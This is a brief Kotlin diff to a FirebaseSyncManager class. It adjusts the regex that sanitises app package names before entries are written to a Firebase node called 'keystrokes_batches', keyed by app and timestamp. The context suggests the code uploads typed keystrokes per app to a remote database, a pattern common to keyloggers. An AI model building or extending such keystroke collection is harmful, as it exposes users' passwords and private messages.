@@ -19,7 +19,7 @@ class FirebaseSyncManager {
                 try {
                     val database = FirebaseDatabase.getInstance()
                     val ref = database.getReference("keystrokes_batches")
-                    val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9._-]"), "_")
+                    val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
 
                     val logData = mapOf(
